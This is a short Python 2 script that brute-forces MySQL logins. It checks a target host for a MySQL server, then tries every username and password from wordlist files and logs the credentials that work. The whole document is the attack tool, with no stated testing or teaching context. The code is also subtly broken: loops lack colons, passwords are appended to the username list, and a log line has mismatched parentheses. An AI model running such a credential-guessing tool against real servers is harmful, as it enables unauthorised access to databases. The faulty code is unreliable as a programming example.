#!/usr/bin/env python
import mysql.connector
import sys
import datetime

argv = sys.argv
host = argv[1]

#Opens both username and password files to be used in the brute force
username = []
with open('usernames.txt', 'r') as f:
    for line in f
    username.append(line.strip())

password = []
with open('password.txt', 'r') as f:
    for line in f
    username.append(line.strip())
    
date = datetime.datetime.now()
log = open('mysqllog.txt', 'a')
log.write('**' + str(date) + '\n')

mysqlconnection = False

#Attempts to establish connection to a mysql server on host and port 3306
print 'Looking for mysql server on {0}'.format(host)
try:
    mydb = mysql.connector.connect(
        host=host,
        user='',
        password='',
        connection_timeout=2
    )
except mysql.connector.errors.ProgrammingError:
    print 'MySql server found! Attempting to login'
    mysqlconnection = True
except mysql.connector.errors.InterfaceError:
    print 'MySql server not found.'
    
connect = False    

#If connection was established and there is a mysql server, attemtps to login with weak and default credentials
if mysqlconnection is True:
    for users in username:
        print "Trying to login as {0}".format(users)
        for pw in password:
            try:
                mydb1 = mysql.connector.connect(
                    host=host,
                    user=users,
                    password=pw
                )
                print 'Login succesful using {0} and {1}'.format(users, pw)
                connect = True
                if connect is True:
                    log.write("Login successful using {0} and {1} on host {2}\n").format(users, pw, host))
            except mysql.connector.errors.ProgrammingError:
                pass
            except mysql.connector.errors.InterfaceError:
                print "Seems we cannot connect"
                exit()


